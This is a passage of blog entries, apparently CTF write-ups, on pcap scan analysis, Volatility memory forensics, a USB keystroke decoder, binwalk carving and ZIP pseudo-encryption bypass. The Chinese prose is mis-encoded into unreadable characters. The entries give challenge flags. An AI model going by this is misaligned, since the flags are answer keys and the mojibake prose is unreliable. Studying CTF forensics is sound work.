        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†-wiresharkã€SYNã€TCPã€HTTP"><a href="#é¢„å¤‡çŸ¥è¯†-wiresharkã€SYNã€TCPã€HTTP" class="headerlink" title="é¢„å¤‡çŸ¥è¯† wiresharkã€SYNã€TCPã€HTTP"></a>é¢„å¤‡çŸ¥è¯† wiresharkã€SYNã€TCPã€HTTP</h1><p>å‚è€ƒã€è‡´æ•¬:<a href="https://blog.csdn.net/lhorse003/article/details/71758812">WireSharkæ•™ç¨‹ â€“ é»‘å®¢å‘ç°ä¹‹æ—…(5) â€“ (nmap)æ‰«ææ¢æµ‹</a></p><h2 id="æ–‡ä»¶åˆ†æ"><a href="#æ–‡ä»¶åˆ†æ" class="headerlink" title="æ–‡ä»¶åˆ†æ"></a>æ–‡ä»¶åˆ†æ</h2><p>é‚£åˆ°æ‰‹çš„æ–‡ä»¶å•¥ä¹Ÿä¸æ˜¯ï¼Œæ–‡ä»¶åzipï¼Œè€ƒè™‘å‹ç¼©æ–‡ä»¶ã€‚<br>è§£å‹åå¾—åˆ°ä¸€æ•°æ®åŒ…ï¼Œç”¨wiresharkæ‰“å¼€</p><h2 id="æ•°æ®åŒ…åˆ†æ"><a href="#æ•°æ®åŒ…åˆ†æ" class="headerlink" title="æ•°æ®åŒ…åˆ†æ"></a>æ•°æ®åŒ…åˆ†æ</h2><p>å¸¸è§„è¿½è¸ªäº†ä¸€ä¸‹TCPæµã€HTTPæµã€å¯¼å‡ºå¯¹è±¡ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆæ”¶è·ã€‚<br>æ¥ä¸‹æ¥åˆ†æé¢˜ç›®ï¼Œè¯´æ˜¯æ‰«æç«¯å£ï¼Œç»“åˆHTTPå¯¼å‡ºå¯¹è±¡ä¸­çš„nmapå­—æ ·ï¼ŒçŒœæµ‹æ˜¯NMAPæ‰«æã€‚<br>ç»“åˆå‚è€ƒä¸­çš„é“¾æ¥ï¼Œå¯ä»¥æ¨æµ‹æ‰«ææ–¹å¼ä¸ºå…¨è¿æ¥æ‰«æã€‚<br>é€šè¿‡å¯¹ç‰¹å¾å­—æ®µçš„åˆ†æï¼Œå‘ç°ç«¯å£å­˜åœ¨çš„æ•°æ®åŒ…è¿”å›çš„TSecrå­—æ®µçš„å€¼ä¸ä¸º0ï¼Œåˆ™å¯ä»¥æ ¹æ®æ­¤æ‰¾å‡ºå¼€æ”¾çš„ç«¯å£ã€‚<br>æŒ‰ctrl+få¼¹å‡ºä¸Šæ–¹æœç´¢æ¡†ï¼Œé€‰æ‹©å­—ç¬¦ä¸²ï¼Œæœç´¢TSecr=4799ã€‚<br><img src="/img/bumiscsantiao.png"></p><h2 id="é¢˜ç›®æ€»ç»“"><a href="#é¢˜ç›®æ€»ç»“" class="headerlink" title="é¢˜ç›®æ€»ç»“"></a>é¢˜ç›®æ€»ç»“</h2><p>è¿™é“é¢˜å…¶å®ä¸å¤ªéš¾ï¼Œæ‡‚å¾—æ‰«ææ–¹å¼å¯ä»¥æŠŠè¿™é¢˜ç§’äº†ï¼Œä½†æ˜¯æˆ‘8å¤ªæ‡‚ï¼Œè¿˜æ˜¯ç°ç™¾åº¦çš„ã€‚äº‹å®è¯æ˜è€ƒé«˜åˆ†æ²¡ç”¨ï¼Œé‡è¦çš„æ˜¯å®è·µï¼</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>usb&amp;å†…å­˜å–è¯</title>
      <link href="2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
      <url>2020/03/09/usb-%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†ï¼šwiresharkæµé‡åˆ†æã€binwalkã€å†…å­˜å–è¯ã€USBã€volatility-ã€stringsã€grep"><a href="#é¢„å¤‡çŸ¥è¯†ï¼šwiresharkæµé‡åˆ†æã€binwalkã€å†…å­˜å–è¯ã€USBã€volatility-ã€stringsã€grep" class="headerlink" title="é¢„å¤‡çŸ¥è¯†ï¼šwiresharkæµé‡åˆ†æã€binwalkã€å†…å­˜å–è¯ã€USBã€volatility ã€stringsã€grep"></a>é¢„å¤‡çŸ¥è¯†ï¼šwiresharkæµé‡åˆ†æã€binwalkã€å†…å­˜å–è¯ã€USBã€volatility ã€stringsã€grep</h1><p>å‚è€ƒã€è‡´æ•¬ï¼š<a href="https://blog.csdn.net/MOLLMY/article/details/100679762">CTF å†…å­˜å–è¯ USBæµé‡åˆ†æ</a></p><h2 id="é™„ä»¶åˆ†æ"><a href="#é™„ä»¶åˆ†æ" class="headerlink" title="é™„ä»¶åˆ†æ"></a>é™„ä»¶åˆ†æ</h2><p>æ‹¿åˆ°é™„ä»¶åï¼Œåªæœ‰ä¸€ä¸ªæ•°æ®åŒ…æ–‡ä»¶ã€‚ä¸ç”¨æƒ³ï¼Œç›´æ¥ç”¨wiresharkæ‰“å¼€åˆ†æä¸€æ³¢ã€‚<br>##æ–‡ä»¶åˆ†æ<br>è¿™ç©æ„ç¡®å®æŒºå¤§çš„ï¼Œé¦–å…ˆè€ƒè™‘åŒ…å«äº†æ–‡ä»¶ï¼Œä½¿ç”¨kali linux ä¸‹çš„å·¥å…·binwalkåˆ†æä¸€æ³¢ã€‚<br>ä½†æ˜¯binwalkå‡ºæ¥çš„é™„ä»¶åœ¨è§£å‹æ—¶éƒ½æŸåäº†ï¼Œæ­¤è·¯ä¸é€šã€‚<br>ç»§ç»­åˆ†ææˆ‘ä»¬çš„æµé‡åŒ…ï¼Œè¿½è¸ªhttpåè®®ã€‚<img src="/img/u1.png"><br>å‘ç°äº†å·¨å¤§çš„åŒ…ï¼Œå¯èƒ½æœ‰é™„ä»¶ï¼Œäºæ˜¯åœ¨wiresharkä¸­å¯¼å‡ºhttpå¯¹è±¡ã€‚ï¼ˆå·¦ä¸Šè§’æ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-httpï¼‰<br>æ¥ä¸‹æ¥è§‚å¯Ÿå¯¼å‡ºçš„æ–‡ä»¶<img src="/img/u2.png"><br>æœ‰ä¸¤ä¸ªä¸€æ ·çš„è¾ƒå¤§çš„phpæ–‡ä»¶ï¼Œè€ƒè™‘æ–‡ä»¶åŒ…å«ã€‚å†æ¬¡ä¸¢åˆ°binwalké‡Œé¢åˆ†æä¸€æ³¢ã€‚<br>æœä¸å…¶ç„¶ï¼Œåˆ†ç¦»å‡ºäº†data.vmemæ–‡ä»¶ã€‚å¯ä»¥ç†è§£ä¸ºvmemæ–‡ä»¶ä¿å­˜äº†å½“æ—¶å†…å­˜ä¸­çš„æ•°æ®ï¼Œä»¥æ”¯æŒåœ¨è™šæ‹Ÿæœºä¸­çš„æš‚åœåŠŸèƒ½ã€‚<br>æ¥ä¸‹æ¥ç”¨å†…å­˜åˆ†æå·¥å…·volatility åˆ†ædata.vmem<br>ä½¿ç”¨æ–¹æ³•ï¼š volatility  -f filename imageinfo //æŸ¥çœ‹é•œåƒä¿¡æ¯ã€‚<br>é€šè¿‡imageinfo å¯ä»¥ç¡®å®šï¼Œé•œåƒä¸ºWinXPSP2x86æˆ–è€…WinXPSP3x86.ï¼ˆå½±å“ä¸å¤§ï¼‰<br>æ¥ä¸‹æ¥ä½¿ç”¨å‘½ä»¤ volatility -f data.vmem â€“profile=WinXPSP2x86 filescan æ‰«æå†…å­˜ä¸­çš„æ–‡ä»¶<img src="/img/u3.png"><br>å¯ä»¥çœ‹åˆ°æœ‰ä¸€å †æ–‡ä»¶ã€‚ç”±äºæ˜¯ctfæ¯”èµ›ï¼Œå°è¯•è¿‡æ»¤æ–‡ä»¶ï¼šæ¯”èµ›åç§°xctfæˆ–è€…flag å³<br>volatility -f data.vmem â€“profile=WinXPSP2x86 filescan |grep flag<br>volatility -f data.vmem â€“profile=WinXPSP2x86 filescan |grep xctf]<br>é€šè¿‡è¿‡æ»¤flag æˆ‘ä»¬æ‰¾åˆ°äº†flag.imgæ–‡ä»¶ã€‚<a href="/img/u4.png"></a></p><h2 id="DUMP-IT"><a href="#DUMP-IT" class="headerlink" title="DUMP IT!"></a>DUMP IT!</h2><p>æ¥ä¸‹æ¥éœ€è¦åšçš„äº‹å°†flag.img å¯¼å‡ºã€‚<br>ä½¿ç”¨å‘½ä»¤ volatility -f data.vmem â€“profile=WinXPSP2x86 dumpfiles -Q 0x0000000001155f90 -D ./<br>å°†æ–‡ä»¶å¯¼å‡ºè‡³å½“å‰ç›®å½•ã€‚<a href="/img/u5.png"></a><br>å¯¼å‡ºæ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ ¼å¼ã€‚<br>æ¥ä¸‹æ¥ç»§ç»­binwalkåˆ†æã€‚<br>å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡ŒåŒ…å«äº†åŠ å¯†çš„usb.txtæ–‡ä»¶ã€‚ä¸‹ä¸€æ­¥å°±æ˜¯è·å–åŠ å¯†çš„å¯†ç ã€‚<br>åœ¨å°è¯•çˆ†ç ´çš„åŒæ—¶ï¼Œç»§ç»­è¿›è¡Œå†…å­˜å–è¯åˆ†æã€‚<br>é€šè¿‡volatilityå·¥å…·çš„å­å‘½ä»¤ hivelist å¯ä»¥è·å¾—å†…å­˜ä¸­çš„æ³¨å†Œè¡¨ä¿¡æ¯ï¼ŒcmdscanæŸ¥çœ‹cmdæ“ä½œï¼ŒconnscanæŸ¥çœ‹ç½‘ç»œè¿æ¥ï¼ŒpslistæŸ¥çœ‹è¿›ç¨‹ã€‚<br>é€šè¿‡cmscanæˆ‘ä»¬å¯ä»¥å‘ç°æç¤ºäº†å¯†ç ï¼š<img src="/img/u6.png"><br>å°è¯•å°†è¯¥å¯†ç ä½œä¸ºæ–‡ä»¶çš„è§£å‹å¯†ç ï¼ˆä½¿ç”¨360è§£å‹ï¼Œå¯ä»¥è‡ªåŠ¨ä¿®å¤æ–‡ä»¶ï¼‰â€”-æˆåŠŸï¼<br>ç°åœ¨è·å¾—äº†æ•²å‡»ç ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å°†æ•²å‡»ç è½¬æ¢ä¸ºå­—ç¬¦ã€‚<br>ä½¿ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">&quot;aA&quot;</span>, <span class="number">0x05</span>:<span class="string">&quot;bB&quot;</span>, <span class="number">0x06</span>:<span class="string">&quot;cC&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;dD&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;eE&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;fF&quot;</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">&quot;gG&quot;</span>, <span class="number">0x0B</span>:<span class="string">&quot;hH&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;iI&quot;</span>, <span class="number">0x0D</span>:<span class="string">&quot;jJ&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;kK&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;lL&quot;</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span class="string">&quot;mM&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;nN&quot;</span>, <span class="number">0x12</span>:<span class="string">&quot;oO&quot;</span>, <span class="number">0x13</span>:<span class="string">&quot;pP&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;qQ&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;rR&quot;</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">&quot;sS&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;tT&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;uU&quot;</span>, <span class="number">0x19</span>:<span class="string">&quot;vV&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;wW&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;xX&quot;</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">&quot;yY&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;zZ&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1!&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2@&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3#&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4$&quot;</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">&quot;5%&quot;</span>, <span class="number">0x23</span>:<span class="string">&quot;6^&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&amp;&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8*&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9(&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0)&quot;</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">&quot;  &quot;</span>, <span class="number">0x2D</span>:<span class="string">&quot;-_&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=+&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&#123;&quot;</span>, <span class="number">0x30</span>:<span class="string">&quot;]&#125;&quot;</span>,  <span class="number">0x32</span>:<span class="string">&quot;#~&quot;</span>,</span><br><span class="line">   <span class="number">0x33</span>:<span class="string">&quot;;:&quot;</span>, <span class="number">0x34</span>:<span class="string">&quot;&#x27;\&quot;&quot;</span>,  <span class="number">0x36</span>:<span class="string">&quot;,&lt;&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&gt;&quot;</span>, <span class="number">0x4f</span>:<span class="string">&quot;&gt;&quot;</span>, <span class="number">0x50</span>:<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code2chr</span>(<span class="params">filepath</span>):</span></span><br><span class="line">    lines = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(filepath,<span class="string">&quot;r&quot;</span>).readlines():</span><br><span class="line">        code = <span class="built_in">int</span>(x[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)   <span class="comment"># å³ç¬¬ä¸‰ä¸ªå­—èŠ‚</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># newline or down arrow - move down</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x51</span> <span class="keyword">or</span> code == <span class="number">0x28</span>:</span><br><span class="line">            pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># up arrow - move up</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="number">0x52</span>:</span><br><span class="line">            pos -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># select the character based on the Shift key</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(lines) &lt;= pos:</span><br><span class="line">            lines.append(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">81</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lines[pos] += usb_codes[code][<span class="number">0</span>]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># check argv</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:\n\tpython keyboardScanCode.py datafile.txt\nhow to get datafile:\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filepath = sys.argv[<span class="number">1</span>]</span><br><span class="line">        code2chr(filepath)</span><br></pre></td></tr></table></figure><p>è¯»å–usbdata.txtå³å¯è·å–flag.<br><img src="/img/u7.png"><br>æ³¨æ„å°†æ‹¬å·[]è½¬ä¸º{}</p><h2 id="é¢˜ç›®æ€»ç»“"><a href="#é¢˜ç›®æ€»ç»“" class="headerlink" title="é¢˜ç›®æ€»ç»“"></a>é¢˜ç›®æ€»ç»“</h2>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 0307xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®€å•misc</title>
      <link href="2020/03/09/%E7%AE%80%E5%8D%95misc/"/>
      <url>2020/03/09/%E7%AE%80%E5%8D%95misc/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†-kali-linuxã€binwalkä½¿ç”¨ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾ã€base64ã€æ‘©æ–¯å¯†ç "><a href="#é¢„å¤‡çŸ¥è¯†-kali-linuxã€binwalkä½¿ç”¨ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾ã€base64ã€æ‘©æ–¯å¯†ç " class="headerlink" title="é¢„å¤‡çŸ¥è¯† :kali linuxã€binwalkä½¿ç”¨ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾ã€base64ã€æ‘©æ–¯å¯†ç "></a>é¢„å¤‡çŸ¥è¯† :kali linuxã€binwalkä½¿ç”¨ã€æ–‡ä»¶å¤´æ–‡ä»¶å°¾ã€base64ã€æ‘©æ–¯å¯†ç </h1><p>é™„ä»¶åˆ†æï¼šæˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒ…æ‹¬äº†ä¸€å¼ å›¾ç‰‡å’Œä¸€ä¸ªå‹ç¼©åŒ…ã€‚å­å‹ç¼©åŒ…ä¸­æœ‰flagï¼Œä½†æ˜¯è¢«åŠ å¯†äº†ã€‚</p><h2 id="å›¾ç‰‡å¤„ç†"><a href="#å›¾ç‰‡å¤„ç†" class="headerlink" title="å›¾ç‰‡å¤„ç†"></a>å›¾ç‰‡å¤„ç†</h2><p>å°†å›¾ç‰‡è§£å‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å›¾ç‰‡æ˜¯è£‚çš„ï¼Œä¸èƒ½çœ‹ã€‚æ‰€ä»¥è€ƒè™‘å°†å›¾ç‰‡ä¿®å¤ã€‚<a href="https://www.cnblogs.com/lwy-kitty/p/3928317.html">å¸¸è§æ–‡ä»¶å¤´å°¾</a><br>ä½¿ç”¨winhexæ‰“å¼€åï¼Œå‘ç°æ–‡ä»¶å¤´å°¾æ­£ç¡®ã€‚ä½†æ˜¯æ–‡ä»¶å°¾éƒ¨å¹¶ä¸æ˜¯ä»¥FF D9ç»“å°¾ã€‚æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘å¯èƒ½æœ‰é¢å¤–çš„æ–‡ä»¶åŒ…å«åœ¨äº†è¿™å¼ å›¾ç‰‡ä¸­ã€‚</p><h2 id="æ–‡ä»¶åˆ†ç¦»"><a href="#æ–‡ä»¶åˆ†ç¦»" class="headerlink" title="æ–‡ä»¶åˆ†ç¦»"></a>æ–‡ä»¶åˆ†ç¦»</h2><p>ä½¿ç”¨binwalk å·¥å…·ï¼Œå¯ä»¥åˆ†ææ–‡ä»¶ç»“æ„ï¼Œå°†å¤åˆæ–‡ä»¶æå–å‡ºæ¥ã€‚<br>ä½¿ç”¨æ–¹æ³•ï¼šbinwalk -e filename  eg:binwalk -e photo.jpg<br><img src="/img/ez1.png"><br>åˆ†æå®Œåå¯ä»¥å‘ç°æ–‡æœ¬ctf.txt æ‰“å¼€åå‘ç°æ˜¯æ‘©æ–¯å¯†ç ï¼Œä½¿ç”¨<a href="https://oktools.net/morse">å·¥å…·</a>å°†å…¶è§£å¯†åä¸ºEPIDEMICSITUATIONOFUNIVERSITYWAR<br>ç”±äºä¸æ˜¯å¸¸è§çš„å¯†ç å½¢å¼ï¼Œäºæ˜¯å°è¯•base64è§£ç ã€‚<br>è§£ç åå¾—åˆ°EPIDEMICSITUATIONOFUNIVERSITYWAR<br>ç„¶åè§£å‹é™„ä»¶ä¸­çš„åŠ å¯†æ–‡ä»¶ã€‚<br>è§£å‹åï¼Œé™„ä»¶flag.txtä¸­çš„æ–‡ä»¶å†…å®¹ä¸ºVGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=<br>çœ‹åˆ°**=**ï¼Œè€ƒè™‘base64ç¼–ç ã€‚è¿›è¡Œè§£ç ã€‚<a href="http://ctf.ssleye.com/base64.html">base64è§£ç å·¥å…·</a><br>è§£ç åçš„å†…å®¹ä¸ºTh1s_is_FlaG_you_aRE_rigHT<br>å³å¯è·å¾—æ­£ç¡®flagã€‚</p><h2 id="é¢˜ç›®æ€»ç»“"><a href="#é¢˜ç›®æ€»ç»“" class="headerlink" title="é¢˜ç›®æ€»ç»“"></a>é¢˜ç›®æ€»ç»“</h2><p>è¿™é“é¢˜ç›¸å¯¹æ¯”è¾ƒç®€å• è™½ç„¶å¸ˆå‚…ä»¬ç§’äº†ï¼Œæˆ‘è¿˜æ˜¯èŠ±äº†å‡ åˆ†é’Ÿæ‰åšå‡ºæ¥ã€‚ä¹Ÿå¯èƒ½æ˜¯è¿æ°”æˆåˆ†ï¼ŒåŠ ä¸Šè¿™é¢˜æ¯”è¾ƒç®€å•ï¼Œæ‰€ä»¥æ€è·¯æ¯”è¾ƒæ¸…æ™°ã€‚<br>è¿™é¢˜çš„å…³é”®æ˜¯æ–‡ä»¶åˆ†ç¦»ä¸çœ‹å¾—æ‡‚ç¼–ç ã€‚<a href="https://blog.csdn.net/lili13897741554/article/details/82177472">baseç³»åˆ—ç¼–ç ä»‹ç»</a></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> 0307xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšè—çš„ä¿¡æ¯</title>
      <link href="2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/"/>
      <url>2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢„å¤‡çŸ¥è¯†ï¼šä¼ªåŠ å¯†é“¾æ¥ã€åå…­è¿›åˆ¶æ–‡ä»¶è¯»å–ã€éŸ³é¢‘å¤„ç†ã€äºŒç»´ç å¤åŸ"><a href="#é¢„å¤‡çŸ¥è¯†ï¼šä¼ªåŠ å¯†é“¾æ¥ã€åå…­è¿›åˆ¶æ–‡ä»¶è¯»å–ã€éŸ³é¢‘å¤„ç†ã€äºŒç»´ç å¤åŸ" class="headerlink" title="é¢„å¤‡çŸ¥è¯†ï¼šä¼ªåŠ å¯†é“¾æ¥ã€åå…­è¿›åˆ¶æ–‡ä»¶è¯»å–ã€éŸ³é¢‘å¤„ç†ã€äºŒç»´ç å¤åŸ"></a>é¢„å¤‡çŸ¥è¯†ï¼šä¼ªåŠ å¯†<a href="https://blog.csdn.net/weixin_41687289/article/details/82695801">é“¾æ¥</a>ã€åå…­è¿›åˆ¶æ–‡ä»¶è¯»å–ã€éŸ³é¢‘å¤„ç†ã€äºŒç»´ç å¤åŸ</h1><h2 id="é™„ä»¶åˆ†æ"><a href="#é™„ä»¶åˆ†æ" class="headerlink" title="é™„ä»¶åˆ†æ"></a>é™„ä»¶åˆ†æ</h2><p>1.æ‹¿åˆ°è¿™é“é¢˜çš„æ–‡ä»¶åï¼Œé¦–å…ˆçœ‹åˆ°ä¸€å¼ äºŒç»´ç ï¼Œè¿˜æœ‰ä¸€ä¸ªæœ‰è§£å‹å¯†ç çš„å‹ç¼©åŒ…ã€‚<br>2.é¦–å…ˆå¯¹è¿™å¼ äºŒç»´ç è¿›è¡Œåˆ†æã€‚æ”¾å…¥WINHEX(16è¿›åˆ¶åˆ†æå·¥å…·)åå¯ä»¥å‘ç°ï¼Œåœ¨æ–‡ä»¶çš„æœ€åéšçº¦æœ‰æç¤ºâ€use base64 to get your flagâ€ã€‚æš‚æ—¶ä¸çŸ¥é“ä»€ä¹ˆç”¨ï¼Œè®°ä¸‹æ¥ã€‚<img src="/img/jd1.png"><br>3.ç”±äºäºŒç»´ç æ˜¯æ®‹ç¼ºçš„ï¼Œé€šè¿‡PSå¯¹äºŒç»´ç çš„ä¸‰ä¸ªå®šä½ç‚¹å¤åŸåå¯ä»¥è·å¾—åŸäºŒç»´ç ï¼Œç„¶è€Œæ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚è¿™é‡Œä¸ä½œè¯¦ç»†è§£é‡Šã€‚<br>4.æ¥ä¸‹æ¥æˆ‘ä»¬ç€æ‰‹åˆ†æè¿™ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ã€‚</p><h2 id="åŠ å¯†å‹ç¼©åŒ…å¤„ç†"><a href="#åŠ å¯†å‹ç¼©åŒ…å¤„ç†" class="headerlink" title="åŠ å¯†å‹ç¼©åŒ…å¤„ç†"></a>åŠ å¯†å‹ç¼©åŒ…å¤„ç†</h2><p>ç”±äºå‹ç¼©åŒ…æ˜¯åŠ å¯†çš„ï¼Œé¦–å…ˆè€ƒè™‘æš´åŠ›ç ´è§£ã€CRC32ç¢°æ’ç­‰æ–¹å¼ç ´è§£å¯†ç â€”-æ— æ•ˆã€‚<br>æ¥ä¸‹æ¥è€ƒè™‘åˆ°å‹ç¼©åŒ…å¯èƒ½æ˜¯ä¼ªåŠ å¯†(å…³äºä¼ªåŠ å¯†çš„è¯¦ç»†æ¦‚å¿µè§é¢„å¤‡çŸ¥è¯†ä¸­çš„é“¾æ¥)ç®€å•æ¥è¯´å°±æ˜¯å®é™…ä¸Šå‹ç¼©åŒ…æ˜¯æ²¡æœ‰åŠ å¯†çš„ï¼Œåªæ˜¯å‡ºç°äº†è¡¨é¢ä¸ŠåŠ å¯†ï¼Œè®©ä½ è¾“å…¥è§£å‹å¯†ç ã€‚<br>ç ´è§£ä¼ªåŠ å¯†çš„æ–¹æ³•ï¼šä½¿ç”¨winhexè½¯ä»¶æ‰“å¼€å‹ç¼©åŒ…ï¼Œå°†504B0304åçš„ç¬¬3ã€4ä¸ªå­—èŠ‚æ”¹ä¸º00 00ï¼Œå°†504B0102åçš„ç¬¬5ã€6ä¸ªå­—èŠ‚æ”¹ä¸º00 00å³å¯ç ´è§£ä¼ªåŠ å¯†ã€‚<img src="/img/jd2.png"> <img src="/img/jd3.png"><br>ä¹‹åå†è§£å‹æ–‡ä»¶å°±ä¸ä¼šæç¤ºè¾“å…¥è§£å‹å¯†ç äº†ã€‚</p><h2 id="éŸ³é¢‘æ–‡ä»¶åˆ†æ"><a href="#éŸ³é¢‘æ–‡ä»¶åˆ†æ" class="headerlink" title="éŸ³é¢‘æ–‡ä»¶åˆ†æ"></a>éŸ³é¢‘æ–‡ä»¶åˆ†æ</h2><p>ä½¿ç”¨éŸ³é¢‘åˆ†æè½¯ä»¶<strong>Audacity</strong>æ‰“å¼€wavæ–‡ä»¶è¿›è¡Œåˆ†æã€‚<br>ç‚¹å‡»è½¯ä»¶å·¦æ–¹å€’ä¸‰è§’ï¼Œæ¨¡å¼åˆ‡æ¢åˆ°æ³¢å½¢(db)å³å¯å‘ç°éŸ³é¢‘æ–‡ä»¶çš„å‰åéƒ½æœ‰å¬ä¸åˆ°ã€ä½†æ˜¯æœ‰åˆ†è´çš„éƒ¨åˆ†ã€‚<img 